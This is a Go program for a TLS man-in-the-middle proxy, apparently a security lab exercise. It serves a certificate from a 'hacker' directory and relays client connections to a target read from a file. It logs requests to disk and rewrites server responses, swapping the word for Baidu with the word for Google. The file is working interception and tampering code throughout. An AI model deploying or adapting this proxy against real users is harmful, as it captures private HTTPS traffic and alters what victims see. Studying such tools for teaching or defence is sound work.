package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"log"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

func PassRecord(conn_receive net.Conn, conn_send net.Conn, buffer []byte, filename string) {
	now := time.Now()
	file, err := os.OpenFile(now.Format("2006-01-02_15-04-05")+filename, os.O_CREATE|os.O_RDWR|os.O_APPEND, 0666)
	if err != nil {
		return
	}
	defer file.Close()
	for {
		n, err := conn_receive.Read(buffer)
		if err != nil {
			return
		}
		reader := bufio.NewReader(strings.NewReader(string(buffer[:n])))
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		reg, err := regexp.Compile("HTTP")
		if err != nil {
			return
		}
		if reg.MatchString(line) {
			reg_host, err := regexp.Compile("Host:")
			if err != nil {
				return
			}
			reg_agent, err := regexp.Compile("User-Agent:")
			if err != nil {
				return
			}
			reg_ac, err := regexp.Compile("Accept:")
			if err != nil {
				return
			}
			var new_buffer string
			new_buffer += line
			for err == nil {
				line, err = reader.ReadString('\n')
				if reg_host.MatchString(line) || reg_agent.MatchString(line) || reg_ac.MatchString(line) {
					new_buffer += line
				}
			}
			new_buffer += "\r\n\r\n"
			file.Write([]byte(new_buffer))
			conn_send.Write([]byte(new_buffer))
		} else { //捕获
			conn_send.Write(buffer[:n])
		}
	}
}

func PassModify(conn_receive net.Conn, conn_send net.Conn, buffer []byte, filename string) {
	now := time.Now()
	file, err := os.OpenFile(now.Format("2006-01-02_15-04-05")+filename, os.O_CREATE|os.O_RDWR|os.O_APPEND, 0666)
	if err != nil {
		return
	}
	defer file.Close()
	for {
		n, err := conn_receive.Read(buffer)
		if err != nil {
			return
		}
		reader := bufio.NewReader(strings.NewReader(string(buffer[:n])))
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		reg, err := regexp.Compile("HTTP")
		if err != nil {
			return
		}

		if reg.MatchString(line) {
			buffer = bytes.Replace(buffer, []byte("百度"), []byte("谷歌"), -1)
			file.Write(buffer[:n])
		} //捕获
		conn_send.Write(buffer[:n])
	}
}

func handleConnection(conn net.Conn, config *tls.Config) {
	defer conn.Close()
	file, err := os.OpenFile("../target_address.txt", os.O_RDONLY, 0666)
	if err != nil {
		return
	}
	target := make([]byte, 1024)
	n, err := file.Read(target)
	if err != nil {
		return
	}
	file.Close()
	remote_conn, err := tls.Dial("tcp", string(target[:(n-1)]), config)
	if err != nil {
		return
	}
	defer remote_conn.Close()
	buffer := make([]byte, 102400)
	remote_buffer := make([]byte, 102400)
	go PassRecord(conn, remote_conn, buffer, "From.txt")
	PassModify(remote_conn, conn, remote_buffer, "Receive.txt")
}

func main() {
	cer, err := tls.LoadX509KeyPair("../hacker/domain.crt", "../hacker/domain.key")
	if err != nil {
		log.Fatal(err)
	}
	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	ln, err := tls.Listen("tcp", "localhost:24626", config)
	if err != nil {
		log.Fatal(err)
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		go handleConnection(conn, config)
	}
}
